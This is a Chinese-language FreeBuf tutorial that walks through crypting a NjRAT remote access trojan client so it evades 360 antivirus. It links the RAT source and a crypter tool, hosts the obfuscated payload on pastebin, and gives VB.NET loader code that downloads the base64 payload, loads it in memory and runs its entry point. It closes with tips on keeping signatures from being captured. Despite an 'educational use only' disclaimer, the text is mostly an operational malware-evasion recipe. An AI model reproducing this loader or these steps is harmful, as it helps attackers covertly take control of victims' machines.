*** 本文作者：艾登——皮尔斯，本文属FreeBuf原创奖励计划，未经许可禁止转载**

**这篇文章鄙人我主要是教大家如何加密免杀国外NjRAT生成的客户端，以达到逃避360杀软检测目的，希望各位Freebuf小粉喜欢。此文章仅用于教育目的，切勿用于非法攻击使用，出现一切法律纠纷与作者无关，全由使用者承担。**

![image.png](https://image.3001.net/images/20180613/1528867868675.png!small)

## 介绍

NjRAT也称为Bladabindi ，是一种远程访问木马 ，允许程序持有者通过文件传播的方式来控制最终用户的计算机以达到攻击的目的。
它于2013年6月首次被安全工程师发现，其中一些变体追溯到2012年11月。它是由讲阿拉伯语的清真作者编写的，主要用来对付中东其他阿拉伯国家的政府、金融、教育、能源等目标(这可非常清真)。
它可以通过网络钓鱼和受感染的USB驱动器传播。它被微软恶意软件防护中心评为“严重”。

### Freebuf往期关于NjRAT的文章

[史上最全的njRAT通信协议分析](http://www.freebuf.com/articles/network/122244.html)

### 准备工作:

NjRAT源码 Github 下载地址：[传送门](https://github.com/AliBawazeEer/RAT-NjRat-0.7d-modded-source-code)

Visual Studio 2017：下载地址[传送门](https://www.visualstudio.com/vs/whatsnew/)

pastebin：[传送门](https://pastebin.com)

Crypter Server： [传送门提取码 te5h](https://pan.baidu.com/s/1-n18h2Ku_SEXwgXWeNoN0Q)

## 过程  

1.打开NjRAT生成恶意客户端备用

![image.png](https://image.3001.net/images/20180613/15288684724986.png!small)

![image.png](https://image.3001.net/images/20180613/15288684798385.png!small)2.打开Crypter
Server混淆工具

![image.png](https://image.3001.net/images/20180613/15288685064222.png!small)

3.点击Crypter Server然后选择刚刚NjRAT生成的恶意客户端

![image.png](https://image.3001.net/images/20180613/15288685475118.png!small)

4.点击确定然后点击Copy

![image.png](https://image.3001.net/images/20180613/15288685736330.png!small)

5.打开pastebin这个网站([www.pastebin.com](http://www.pastebin.com))

![image.png](https://image.3001.net/images/20180613/15288686307828.png!small)

6.把在Crypter Serve生成的混淆Code粘贴进去

![image.png](https://image.3001.net/images/20180613/15288686767284.png!small)

7.点击Create New Paste

![image.png](https://image.3001.net/images/20180613/15288686973570.png!small)

8.生成出来后点击raw

![image.png](https://image.3001.net/images/20180613/15288687163438.png!small)  

9.记住链接我raw出来的链接地址是:<https://pastebin.com/raw/niY7M5Np>![image.png](https://image.3001.net/images/20180613/15288687335181.png!small)

10.打开Visual Studio 2017

![image.png](https://image.3001.net/images/20180613/15288687929159.png!small)11.创建一个新的项目

![image.png](https://image.3001.net/images/20180613/15288688078812.png!small)

12.然后选择VisualBasic>windows桌面>Windows 窗体应用(.NET Framework)

![image.png](https://image.3001.net/images/20180613/15288688382519.png!small)

13.然后点击确定进入下面这个界面

![image.png](https://image.3001.net/images/20180613/152886885681.png!small)

14.双击箭头所指示的空白处

![image.png](https://image.3001.net/images/20180613/15288688798820.png!small)

15.删除这些Code

![image.png](https://image.3001.net/images/20180613/15288688958919.png!small)

16.Copy下面的Code到里面

    
    
    Public Class Form1
      Protected loginn As New Net.WebClient
      Protected loginn1 As String = loginn.DownloadString("votre url de votre code,il doit etre visible dans le site")
      Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
          Dim mr As Object = loginn2.load(Convert.FromBase64String(loginn1))
          Dim mr1 As Object = CallByName(mr, "EntryPoint", CallType.Get)
          DirectCast(mr1, Reflection.MethodBase).Invoke("", Nothing)
      End Sub
      Protected loginn2 As Object = AppDomain.CurrentDomain
    End Class  
    

![image.png](https://image.3001.net/images/20180613/15288689402192.png!small)上面的Code主要是从服务器得到一个base64编码过的数据，这个数据是一个宏，base64解码之后运行这个宏。

17.把你刚刚在Pastebin网站上raw出来的Code的链接<https://pastebin.com/raw/niY7M5Np>

Copy进入VB工程，把Form1.vb工程中的”votre url de votre code,il doit etre visible dans le
site”替换成Pastebin上Raw出来的Code链接。

![image.png](https://image.3001.net/images/20180613/15288689958402.png!small)

18.右击你的项目名称

![image.png](https://image.3001.net/images/20180613/15288690167276.png!small)

19.选择添加模块

![image.png](https://image.3001.net/images/20180613/15288690352487.png!small)

20.选择”模块”然后点击确定

![image.png](https://image.3001.net/images/20180613/15288690762005.png!small)

21.然后把”模块”里面的Code给删除，然后回到”Crypter Server”点击Copy再点击Code，然后点击”Show
Code”再点击Copy复制

![image.png](https://image.3001.net/images/20180613/15288691379694.png!small)

24.粘贴到刚刚在VB工程里面创建的模块

![image.png](https://image.3001.net/images/20180613/15288691558830.png!small)

25.点击”项目”>”项目属性”

![image.png](https://image.3001.net/images/20180613/15288691732731.png!small)

26.启用应用程序框架取消打勾

![image.png](https://image.3001.net/images/20180613/15288691825012.png!small)

27.右击项目封装成exe文件生成

![image.png](https://image.3001.net/images/20180613/15288695208799.png!small)

然后打开360杀毒软件进行查杀一下

![image.png](https://image.3001.net/images/20180613/15288695709540.png!small)

扫描日志:

![image.png](https://image.3001.net/images/20180613/15288695806883.png!small)

B站视频链接:<https://www.bilibili.com/video/av24811247>

演示视频下载链接: <https://pan.baidu.com/s/1Ags9tokNth60AxgrIvX7Jg> 密码: 1hnj

主要是通过base64编码混淆了NjRAT生成的恶意客户端Code，让杀软增加了查杀难度。其次大家不要频繁上传查杀自己生成的Payload以免被抓取到指纹特征GG。

 *** 本文作者：艾登——皮尔斯，本文属FreeBuf原创奖励计划，未经许可禁止转载**

